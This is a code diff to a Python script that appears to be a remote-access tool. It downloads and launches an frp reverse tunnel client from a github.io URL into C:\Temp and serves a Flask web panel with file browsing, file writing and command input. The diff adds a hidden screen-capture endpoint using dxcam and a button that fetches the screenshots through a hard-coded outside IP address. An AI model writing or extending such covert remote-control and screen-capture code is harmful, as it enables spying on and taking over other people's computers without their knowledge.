@@ -58,10 +58,11 @@ def WebSocketProcess():
 
 
 def WebFlaskProcess():
-    import os,json
+    import os,json,dxcam,io
     from flask import Flask, request, Response, stream_with_context
     from subprocess import Popen
     import urllib.request
+    from PIL import Image
 
     os.chdir("C:\\Temp")
     if not os.path.exists("frpc.exe"):
@@ -70,6 +71,7 @@ def WebFlaskProcess():
     urllib.request.urlretrieve("https://python191003.github.io/frpc.toml", "frpc.toml")
     Popen("frpc.exe -c frpc.toml")
     app = Flask(__name__)
+    camera = dxcam.create()
 
     @app.after_request
     def changeHeaders(response):
@@ -94,6 +96,17 @@ def WebFlaskProcess():
         with open(path, "w") as f:
             f.write(request.data.decode("utf-8"))
         return "ok"
+
+    @app.route("/screenshot/<path:path>")
+    def screenshot(path):
+        img = camera.grab()
+        img = Image.fromarray(img)
+        img.resize((1920,1080))
+        byteimg = io.BytesIO()
+        img.save(byteimg, format="JPEG")
+        byteimg.seek(0)
+        return Response(byteimg.getvalue(), mimetype="image/jpeg")
+
 
     @app.route("/")
     def index():
@@ -150,11 +163,21 @@ def WebFlaskProcess():
 
             #cmd-input {
                 position: absolute;
-                top: 10px;
-                left: 10px;
+                top: 0px;
+                left: 0px;
                 width: 400px;
-                height: 40px;
+                height: 200px;
                 visibility: hidden;
+            }
+
+            #shot {
+                position: absolute;
+                top: 50px;
+                right: 10px;
+                width: 30px;
+                height: 30px;
+                border-radius: 7px;
+                background-color: #ffffff;
             }
         </style>
     </head>
@@ -162,6 +185,7 @@ def WebFlaskProcess():
         <div id="file-explorer"></div>
         <button id="next">C</button>
         <button id="break">ESC</button>
+        <button id="shot">S</button>
         <input id="cmd-input">
         <script>
             document.addEventListener('DOMContentLoaded', function () {
@@ -180,7 +204,7 @@ def WebFlaskProcess():
                     if (/Mobile|Android|iPhone/i.test(navigator.userAgent)){
                         const inputBox = document.getElementById('cmd-input');
                         inputBox.style.visibility = 'visible';
-                        inputBox.style.width = window.innerWidth - 120 + 'px';
+                        inputBox.style.width = window.innerWidth - 100 + 'px';
                         explorerDiv.onclick = (e) => {
                             e.preventDefault();
                             inputBox.focus();
@@ -306,13 +330,32 @@ def WebFlaskProcess():
                         goUpOneLevel(filePath);
                     });
                 }
+
+                function screenshot(e) {
+                    shots.style.visibility = 'hidden';
+                    explorerDiv.contentEditable = false;
+                    explorerDiv.innerHTML = '';
+                    const img = document.createElement('img');
+                    img.src = 'http://82.156.242.74:8080/screenshot/'+Math.random();
+                    img.style.width = '100%';
+                    explorerDiv.appendChild(img);
+                    const esc=document.getElementById('break')
+                    esc.style.visibility = 'visible';
+                    esc.onclick = () => {
+                        explorerDiv.innerHTML = '';
+                        loadDirectory(currentPath);
+                        esc.style.visibility = 'hidden';
+                        shots.style.visibility = 'visible';
+                    };
+                }
+                const shots = document.getElementById('shot');
+                shots.onclick = screenshot;
             });
         </script>
     </body>
     </html>"""
 
     app.run(host="127.0.0.1",port=8080,debug=True)
-
 
 def verify():
     from subprocess import run
